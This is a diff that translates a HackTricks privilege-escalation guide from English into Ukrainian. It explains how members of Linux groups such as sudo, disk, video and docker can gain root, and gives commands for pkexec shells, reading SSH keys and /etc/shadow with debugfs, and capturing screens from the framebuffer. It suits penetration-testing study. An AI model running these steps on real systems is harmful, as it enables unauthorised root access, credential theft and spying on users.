@@ -1,26 +1,23 @@
-
-
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Інші способи підтримки HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
+* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
+* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub.**
 
 </details>
 
 
-# Sudo/Admin Groups
+# Групи Sudo/Admin
 
-## **PE - Method 1**
+## **PE - Метод 1**
 
-**Sometimes**, **by default \(or because some software needs it\)** inside the **/etc/sudoers** file you can find some of these lines:
-
+**Іноді**, **за замовчуванням \(або через необхідність деякого програмного забезпечення\)** всередині файлу **/etc/sudoers** ви можете знайти деякі з цих рядків:
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -28,49 +25,38 @@ Other ways to support HackTricks:
 # Allow members of group admin to execute any command
 %admin 	ALL=(ALL:ALL) ALL
 ```
+Це означає, що **будь-який користувач, який належить до групи sudo або admin, може виконати будь-яку дію як sudo**.
 
-This means that **any user that belongs to the group sudo or admin can execute anything as sudo**.
-
-If this is the case, to **become root you can just execute**:
-
+Якщо це так, для **отримання прав root ви можете просто виконати**:
 ```text
 sudo su
 ```
+## Підвищення привілеїв - Метод 2
 
-## PE - Method 2
-
-Find all suid binaries and check if there is the binary **Pkexec**:
-
+Знайдіть всі suid-бінарники та перевірте, чи є серед них бінарний файл **Pkexec**:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-
-If you find that the binary pkexec is a SUID binary and you belong to sudo or admin, you could probably execute binaries as sudo using pkexec.  
-Check the contents of:
-
+Якщо ви виявите, що бінарний файл pkexec є SUID-бінарним і ви належите до групи sudo або admin, ви, ймовірно, зможете виконувати бінарні файли як sudo, використовуючи pkexec.
+Перевірте вміст:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
+Тут ви знайдете, які групи мають дозвіл на виконання **pkexec** і **за замовчуванням** в деяких дистрибутивах Linux можуть **з'явитися** деякі з груп **sudo або admin**.
 
-There you will find which groups are allowed to execute **pkexec** and **by default** in some linux can **appear** some of the groups **sudo or admin**.
-
-To **become root you can execute**:
-
+Для **отримання прав root ви можете виконати**:
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
-
-If you try to execute **pkexec** and you get this **error**:
-
+Якщо ви намагаєтеся виконати **pkexec** і отримуєте цю **помилку**:
 ```bash
 polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
+**Це не через відсутність дозволів, а через відсутність підключення без GUI**. Існує обхідне рішення для цієї проблеми тут: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Вам потрібно **2 різні сесії ssh**:
 
-**It's not because you don't have permissions but because you aren't connected without a GUI**. And there is a work around for this issue here: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). You need **2 different ssh sessions**:
-
-{% code title="session1" %}
+{% code title="сесія1" %}
 ```bash
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
@@ -78,45 +64,38 @@ pkexec "/bin/bash" #Step 3, execute pkexec
 ```
 {% endcode %}
 
-{% code title="session2" %}
+{% code title="сесія2" %}
 ```bash
 pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 #Step 4, you will be asked in this session to authenticate to pkexec
 ```
 {% endcode %}
 
-# Wheel Group
+# Група Wheel
 
-**Sometimes**, **by default** inside the **/etc/sudoers** file you can find this line:
-
+Іноді, за замовчуванням у файлі **/etc/sudoers** ви можете знайти цей рядок:
 ```text
 %wheel	ALL=(ALL:ALL) ALL
 ```
+Це означає, що **будь-який користувач, який належить до групи wheel, може виконати будь-що як sudo**.
 
-This means that **any user that belongs to the group wheel can execute anything as sudo**.
-
-If this is the case, to **become root you can just execute**:
-
+Якщо це так, **щоб стати root, ви можете просто виконати**:
 ```text
 sudo su
 ```
+# Група Shadow
 
-# Shadow Group
-
-Users from the **group shadow** can **read** the **/etc/shadow** file:
-
+Користувачі з **групи shadow** можуть **читати** файл **/etc/shadow**:
 ```text
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
+Так, прочитайте файл і спробуйте **розшифрувати деякі хеші**.
 
-So, read the file and try to **crack some hashes**.
+# Група диска
 
-# Disk Group
+Ця привілея майже **еквівалентна доступу до root**, оскільки ви можете отримати доступ до всіх даних всередині машини.
 
- This privilege is almost **equivalent to root access** as you can access all the data inside of the machine.
-
-Files:`/dev/sd[a-z][1-9]`
-
+Файли: `/dev/sd[a-z][1-9]`
 ```text
 debugfs /dev/sda1
 debugfs: cd /root
@@ -124,79 +103,68 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-
-Note that using debugfs you can also **write files**. For example to copy `/tmp/asd1.txt` to `/tmp/asd2.txt` you can do:
-
+Зверніть увагу, що за допомогою debugfs ви також можете **записувати файли**. Наприклад, щоб скопіювати `/tmp/asd1.txt` в `/tmp/asd2.txt`, ви можете виконати:
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
+Однак, якщо ви спробуєте **записати файли, що належать root** \(наприклад, `/etc/shadow` або `/etc/passwd`\), ви отримаєте помилку "**Permission denied**".
 
-However, if you try to **write files owned by root** \(like `/etc/shadow` or `/etc/passwd`\) you will have a "**Permission denied**" error.
+# Група відео
 
-# Video Group
-
-Using the command `w` you can find **who is logged on the system** and it will show an output like the following one:
-
+Використовуючи команду `w`, ви можете знайти **хто увійшов в систему** і отримаєте вивід, схожий на наступний:
 ```bash
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
+**tty1** означає, що користувач **yossi залогінений фізично** до терміналу на машині.
 
-The **tty1** means that the user **yossi is logged physically** to a terminal on the machine.
-
-The **video group** has access to view the screen output. Basically you can observe the the screens. In order to do that you need to **grab the current image on the screen** in raw data and get the resolution that the screen is using. The screen data can be saved in `/dev/fb0` and you could find the resolution of this screen on `/sys/class/graphics/fb0/virtual_size`
-
+Група **video** має доступ до перегляду виводу екрану. В основному, ви можете спостерігати за екранами. Для цього потрібно **захопити поточне зображення на екрані** у вигляді сирої даних та отримати роздільну здатність, яку використовує екран. Дані екрану можна зберегти в `/dev/fb0`, а роздільну здатність цього екрану можна знайти в `/sys/class/graphics/fb0/virtual_size`.
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-
-To **open** the **raw image** you can use **GIMP**, select the **`screen.raw`** file and select as file type **Raw image data**:
+Для **відкриття** **сирого зображення** ви можете використовувати **GIMP**, виберіть файл **`screen.raw`** та виберіть тип файлу **Raw image data**:
 
 ![](../../.gitbook/assets/image%20%28208%29.png)
 
-Then modify the Width and Height to the ones used on the screen and check different Image Types \(and select the one that shows better the screen\):
+Потім змініть ширину та висоту на використані на екрані та перевірте різні типи зображень \(і виберіть той, який краще показує екран\):
 
 ![](../../.gitbook/assets/image%20%28295%29.png)
 
-# Root Group
+# Група Root
 
-It looks like by default **members of root group** could have access to **modify** some **service** configuration files or some **libraries** files or **other interesting things** that could be used to escalate privileges...
+Здається, за замовчуванням **члени групи root** можуть мати доступ до **зміни** деяких файлів конфігурації **служб** або деяких файлів **бібліотек** або **інших цікавих речей**, які можуть бути використані для підвищення привілеїв...
 
-**Check which files root members can modify**:
-
+**Перевірте, які файли можуть змінювати члени групи root**:
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
+# Група Docker
 
-# Docker Group
-
-You can mount the root filesystem of the host machine to an instance’s volume, so when the instance starts it immediately loads a `chroot` into that volume. This effectively gives you root on the machine.
+Ви можете підключити кореневу файлову систему хост-машини до тома екземпляра, тому коли екземпляр запускається, він негайно завантажує `chroot` в цей том. Це фактично дає вам root-доступ до машини.
 
 {% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
 
 {% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
 
-# lxc/lxd Group
+# Група lxc/lxd
 
-[lxc - Privilege Escalation](lxd-privilege-escalation.md)
+[lxc - Підвищення привілеїв](lxd-privilege-escalation.md)
 
 
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Інші способи підтримки HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у PDF-форматі**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
+* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
+* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.
 
 </details>
-
-
